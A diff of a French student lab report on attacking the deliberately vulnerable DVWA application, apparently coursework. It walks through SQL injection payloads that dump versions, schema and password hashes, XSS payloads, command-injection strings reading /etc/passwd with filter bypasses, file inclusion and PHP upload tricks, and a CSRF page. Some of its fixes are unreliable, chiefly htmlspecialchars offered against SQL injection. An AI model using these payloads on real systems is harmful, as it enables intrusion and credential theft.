@@ -1,5 +1,8 @@
 # TP 5 - 6
 
+* Valentin CROCHEMORE
+* Yoann FLEURY
+
 ## Exercice 1 (Installation)
 
 Installation sans encombre de la machine virtuelle. Accès à l'application web
@@ -7,20 +10,26 @@ sans problème.
 
 ## Exercice 2 (Injections SQL)
 
+**LOW**
+____
+
 ### Comment connaitre l'ensemble des utilisateurs ?
 
-Il suffit d'accéder à cet URL : [](localhost/vulnerabilities/sqli/?id='+OR+'1'+%3D'1&Submit=Submit)
+Il suffit d'accéder à cet URL : [localhost](localhost/vulnerabilities/sqli/?id='+OR+'1'+%3D'1&Submit=Submit)
 Nous avons donc injecté ici du SQL grâce au paramètre `GET id` de l'URL.
+Pour s'en protéger, il suffirait de filtrer les paramètres pour changer les
+caractères interdit en entités HTML (en utilisant la fonction PHP
+`htmlspecialchars()`).
 
 ### Comment récupérer la version de MySQL
 
-Pour récupérer la version de MySQL en SQL, il faut lancer la commande 
+Pour récupérer la version de MySQL en SQL, il faut lancer la commande
 
 ```sql
 SELECT @@version
 ```
 
-donc pour récupérer la version via l'application web il suffit d'injecter le 
+donc pour récupérer la version via l'application web il suffit d'injecter le
 code suivant :
 
 ```sql
@@ -35,9 +44,12 @@ First name: 5.7.16-0ubuntu0.16.04.1
 Surname:
 ```
 
+Il faudrait pour s'en protéger filtrer la requête pour changer les caractères
+interdits. On pourrait utiliser la fonction PHP `htmlspecialchars()`.
+
 ### Comment récupérer le nom de la base de données utilisée ?
 
-Comme pour la question ci-dessus, sauf que cette fois, la requête SQL est la 
+Comme pour la question ci-dessus, sauf que cette fois, la requête SQL est la
 suivante :
 
 ```sql
@@ -52,6 +64,9 @@ First name: dvwa
 Surname:
 ```
 
+Encore une fois, pour se protéger, utilisation d'une méthode permettant de
+remplacer les caractères spéciaux.
+
 ### Comment récupérer l'utilisateur de la base de données ?
 
 Idem avec la requête `SELECT USER();` et le résultat suivant :
@@ -61,6 +76,8 @@ ID: ' UNION SELECT USER(), ''#
 First name: root@localhost
 Surname:
 ```
+Une nouvelle fois, utilisation d'une méthode permettant de remplacer les
+caractères spéciaux pour se protéger d'une telle attaque.
 
 ### Comment récupérer l'endroit où est stocké la base de données ?
 
@@ -71,6 +88,8 @@ ID: ' UNION SELECT @@datadir, ''#
 First name: root@localhost
 Surname:
 ```
+Une nouvelle fois, utilisation d'une méthode permettant de remplacer les
+caractères spéciaux pour se protéger d'une telle attaque.
 
 ### Comment connaitre le schema de la base de données ?
 
@@ -121,6 +140,9 @@ ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE
 First name: users
 Surname: TOTAL_CONNECTIONS
 ```
+
+Une nouvelle fois, utilisation d'une méthode permettant de remplacer les
+caractères spéciaux pour se protéger d'une telle attaque.
 
 ### Comment récupérer les mot de passes des utilisateurs ?
 
@@ -307,14 +329,54 @@ Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 Les mots de passe sont stockés en MD5 qui est une fonction de hashage.
 Mon mot de passe est **bonjour92** ce qui donne `31ab78a60e3fc6fb7a38bbaf173e0053`
 
-### Changez en medium, quelles sont les différences ?
+Une nouvelle fois, utilisation d'une méthode permettant de remplacer les
+caractères spéciaux pour se protéger d'une telle attaque.
+
+De plus, il faudrait utiliser le système de hashage B_CRYPT plutôt que MD5 qui
+ne vaut plus rien aujourd'hui. B_CRYPT a l'avantage de générer un sel ce qui
+permet de fortifier le hashage.
+
+**MEDIUM**
+____
 
 Les requêtes se font en POST et les caractères spéciaux sont échappés, mais cela
-ne sert à rien.
+ne sert à rien. L'application est toujours contournable en modifiant le code
+HTML en ajoutant un `input` avec le bon `id` et d'envoyer la requête ainsi.
 
-### Changez en high, quelles sont les différences ?
+On est obligé de récupérer les informations deux par deux pour respecter le
+nombre de colonne étant donné que le caractère `'` est échapé.
 
-Il y a un limit 1 mais avec un commentaire, il ne sert plus à rien.
+On a donc :
+
+* Pour la version de mysql et le nom de la base de données :
+`1 UNION select @@version, database()`
+* Pour le nom de l'utilisateur sous lequel tourne la base de données et
+l'endroit où est stockée la base de données : `1 UNION select @@datadir, user()`
+* Pour récupérer les informations stockées sur les utilisateurs :
+
+```
+1 UNION SELECT table_name, column_name FROM information_schema.columns
+WHERE table_schema != mysql AND table_schema != information_schema
+AND table_name = users
+```
+
+* Pour récupérer les noms de tables :
+
+```
+1 UNION SELECT table_name, column_name FROM information_schema.columns
+```
+
+* Pour récupérer le mot de passe :
+
+```
+1 UNION SELECT user_id, password FROM users
+```
+
+**HIGH**
+____
+
+Le système est le même qu'en **LOW**, mais il faut mettre un commentaire à la 
+fin de la requête pour ignorer la limite de données à récupérer.
 
 ## Exercice 3 (XSS)
 
@@ -340,8 +402,11 @@ window.location.assign("http://www.w3c.com")
 
 ### XSS Stored, insérer une image :
 
+**LOW**
+____
+
 Il suffit de retirer l'attribut `maxlength` sur la balise du `textarea` ce
-qui permet de mettre la taille que l'on veut dedans. Ensuite, il suffit de 
+qui permet de mettre la taille que l'on veut dedans. Ensuite, il suffit de
 mettre le texte suivant et de l'envoyer :
 
 ```html
@@ -352,20 +417,43 @@ ce qui nous donne un mignon petit Quokka sur notre page :
 
 ![Selfie de Quokka](assets/quokka.png)
 
-### XSS Stored, niveau medium :
+En faille XSS Stored nos données sont donc sauvegardées en base de données,
+alors qu'en **reflected** les données sont directement affichées sur la page.
 
-Il suffit de faire la même chose mais dans l'input pour le nom.
+**MEDIUM**
+____
+
+Il suffit de faire la même chose mais dans l'input pour le nom car celui-ci
+n'est pas protégé.
 
 ![Selfie de Quokka et son ami humain](assets/quokka2.png)
 
+**HIGH**
+____
+
+On peut passer par les `Events` JavaScript en ajoutant un `listener` sur un
+élément HTML que l'on insère dans le `textarea`.
+
+```html
+<div onmouseover="alert('test');"
+    style="height: 1000px;background-color: red;">
+</div>
+```
+
+> Quand l'utilisateur passe sa souris sur la `div`, le code JS est éxecuté.
+> On peut imaginer une `div` avec du code malveillant à la place d'une simple
+> et innofensive `alert`.
+
 ## Exercice 4 (Command Injection)
+
+**LOW**
+____
 
 ### Affichez la liste des fichiers à la racine
 
-Il suffit d'insérer le texte suivant dans l'input de la page et de
-valider :
+Il suffit d'insérer le texte suivant dans l'input de la page et de valider :
 
-```
+```sh
 127.0.0.1 && ls /
 ```
 
@@ -414,7 +502,7 @@ la racine.
 
 ### Faites afficher le contenu du fichier /etc/passwd
 
-On insère `127.0.0.1 && cat /etc/passwd` dans l'input et on a le contenu 
+On insère `127.0.0.1 && cat /etc/passwd` dans l'input et on a le contenu
 suivant :
 
 ```
@@ -473,15 +561,61 @@ etudiant:x:1001:1001:,,,:/home/etudiant:/bin/bash
 
 ### Faites afficher le contenu du fichier `/etc/shadow`
 
-Impossible, il faudrait que le groupe www-data ait même droits que root.
+Impossible, il faudrait que le groupe `www-data` ait les mêmes droits que
+`root`.
+
+Pour contrer ces failles, il faudrait utiliser une validation par expressions
+régulières pour ne prendre que les IPs.
+
+**MEDIUM**
+____
+
+Pour le mode **MEDIUM** le développeur tente de retirer les `;` et les `&&`.
+On peut donc contrer cela en insérant `127.0.0.1 &;& cat /etc/passwd`. Le `;`
+sera alors retiré et le code sera exécuté.
+
+**HIGH**
+____
+
+Les caractères `&&` sont supprimés individuellement, ce qui empêche le moindre
+`&`. Ici, on insère `127.0.0.1 |&| cat /etc/passwd` et le code est injecté.
+
+**SOLUTION**
+____
+
+Pour tous les cas ci-dessus, il suffit donc de filtrer l'entrée en ne prenant
+que les IPs en mettant une expression régulière.
 
 ## Exercice 5 (File Inclusion)
 
-<!-- TODO -->
+**LOW**
+____
+
+Un simple include est fait. Le fichier à include est présent dans l'url en le
+remplaçant par un chemin vers un autre fichier par exemple :
+`file:///home/etudiant/test.php`, ce fichier sera inclu, il suffit alors que
+le fichier soit du php et ce dernier sera interprété on peut alors exécuter
+du php sur le serveur.
+
+**MEDIUM**
+____
+
+Les `../` et `..\` sont enlevés la méthode précédente fonctionne toujours.
+Il faut dans ce cas utiliser un chemin absolu et donc non relatif.
+
+**HIGH**
+____
+
+Seul les fichiers commançant par `file` sont autorisés, or
+`file:///home/etudiant/test.php` commence par file donc cela
+fonctionne toujours.
 
 ## Exercice 6 (File Upload)
 
-<!-- TODO -->
+On peut upload n'importe quel fichier comme un fichier PHP par exemple.
+Ensuite en allant a l'url où se trouve le fichier que l'on vient d'upload on
+peut donc exécuter notre fichier PHP. Cela est dû au fait que la nature du
+fichier n'est pas vérifier.
 
 ## Exercice 7 (CSRF)
 
@@ -511,3 +645,6 @@ On a créé un exemple de page HTML pour cela :
 </html>
 ```
 
+Ainsi, si nous sommes malveillant, nous pouvons récupérer le mot de passe via
+un script JavaScript et nous pouvons maintenant nous connecter sur l'application
+avec les nouveaux identifiants.
